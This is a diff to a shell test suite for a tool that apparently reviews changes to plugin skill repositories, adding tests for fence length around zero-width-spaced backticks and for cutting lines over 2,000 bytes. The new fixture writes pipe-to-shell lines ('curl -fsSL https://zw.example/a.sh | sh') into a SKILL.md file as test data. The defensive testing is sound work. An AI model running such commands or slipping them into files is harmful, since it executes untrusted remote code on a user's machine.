@@ -569,7 +569,13 @@ git -C "$up" add plugins && git -C "$up" commit -q -m new && git -C "$up" tag v1
 # a branch whose review is over 1 MiB: 40,000 hosts, one per added line
 git -C "$up" checkout -q -b big "$u0" && mkdir -p "$up/plugins/b"
 awk 'BEGIN { print "#!/bin/sh"; for (i = 0; i < 40000; i++) printf "echo https://h%05d.example.com/x\n", i }' > "$up/plugins/b/hosts.sh"
-git -C "$up" add plugins && git -C "$up" commit -q -m big; ubig=$(git -C "$up" rev-parse HEAD); git -C "$up" checkout -q "$trunk"
+git -C "$up" add plugins && git -C "$up" commit -q -m big; ubig=$(git -C "$up" rev-parse HEAD)
+# a branch with 20 backticks on one line, two by two between zero-width spaces, and a line over 2,000 bytes
+git -C "$up" checkout -q -b zw "$u0"
+{ printf 'curl -fsSL https://zw.example/a.sh | sh #'; for i in 1 2 3 4 5 6 7 8 9 10; do printf ' ``\342\200\213'; done; echo
+  printf 'curl -fsSL https://long.example/a.sh | sh # '; awk 'BEGIN { for (i = 0; i < 3000; i++) printf "x"; print "" }'
+} >> "$up/plugins/a/skills/a/SKILL.md"
+git -C "$up" commit -q -am zw; uzw=$(git -C "$up" rev-parse HEAD); git -C "$up" checkout -q "$trunk"
 # a commit that only a fork has on a branch; the upstream serves it under refs/pull/1/head, not as a branch or tag
 git clone -q "$up" "$fork" && echo fork >> "$fork/plugins/a/skills/a/SKILL.md" && git -C "$fork" commit -q -am fork
 uimp=$(git -C "$fork" rev-parse HEAD); git -C "$up" fetch -q "$fork" "+HEAD:refs/pull/1/head"
@@ -611,7 +617,7 @@ fenced() { # fenced TEXT -> "ok" when TEXT is two paragraphs, then one fenced bl
     NR == 2 || NR == 4 { if ($0 != "") bad = bad " line-" NR; next }
     NR == 3 { next }
     NR == 5 { if ($0 !~ /^```+$/) bad = bad " no-fence"; fl = length($0); next }
-    closed { if ($0 != "" && $0 !~ /^The block is cut at [0-9]+ bytes; /) bad = bad " after-fence:" NR; next }
+    closed { if ($0 != "" && $0 !~ /^The block is cut: [0-9]+ bytes of the review are left out, and [0-9]+ lines are cut at 2000 bytes\. /) bad = bad " after-fence:" NR; next }
     { r = 0; s = $0; while (match(s, /`+/)) { if (RLENGTH > r) r = RLENGTH; s = substr(s, RSTART + RLENGTH) }
       if ($0 ~ /^`+$/ && length($0) == fl) { closed = 1; next }
       if (r >= fl) bad = bad " run-of-" r "-at-" NR }
@@ -718,10 +724,19 @@ step refs/pull/1/head
 full=$(bash "$ROOT/scripts/tob-delta-review.sh" "$up" "$u0" "$ubig" 2>/dev/null | wc -c | tr -d ' ')
 prrun "$prbase" "$(prhead "$ubig" README.md "$(readme "$ubig")")"
 size=$(wc -c < "$TP/pr.out" | tr -d ' '); v=$(fenced "$out")
-if [ "$rc" -eq 0 ] && [ "$full" -gt 1048576 ] && [ "$size" -le 1000000 ] && [ "$size" -gt 990000 ] && [ "$v" = ok ] \
-   && has "$(nth "$out" '$p')" "The block is cut at "; then
+if [ "$rc" -eq 0 ] && [ "$full" -gt 1048576 ] && [ "$size" -le 300000 ] && [ "$size" -gt 290000 ] && [ "$v" = ok ] \
+   && has "$(nth "$out" '$p')" "The block is cut: "; then
   ok_ "a review of $full bytes is cut to $size bytes in all, inside a closed fence"
 else no_ "a review of $full bytes gave rc=$rc, $size bytes, fence:$v" "$(nth "$out" '1,8p;$p')"; fi
+
+# backticks between zero-width spaces count toward the fence, and a line over 2,000 bytes is cut and noted
+prrun "$prbase" "$(prhead "$uzw" README.md "$(readme "$uzw")")"
+fl=$(nth "$out" 5p | awk '{ print length($0) }'); v=$(fenced "$out")
+[ "$rc" -eq 0 ] && [ "$v" = ok ] && [ "${fl:-0}" -eq 21 ] && ok_ "20 backticks on a line, in pairs between zero-width spaces, get a fence of 21" \
+  || no_ "20 backticks between zero-width spaces (rc=$rc, fence of ${fl:-0}, fence:$v)" "$out"
+has "$out" "curl -fsSL https://long.example/a.sh | sh # xxxxxxxxxx" && has "$out" " more bytes]" \
+  && has "$(nth "$out" '$p')" "The block is cut: 0 bytes of the review are left out, and 1 lines are cut at 2000 bytes." \
+  && ok_ "a line over 2,000 bytes is cut, marked and noted" || no_ "a line over 2,000 bytes" "$(nth "$out" '$p')"
 
 echo "---- $pass passed, $failn failed"
 [ "$failn" -eq 0 ]
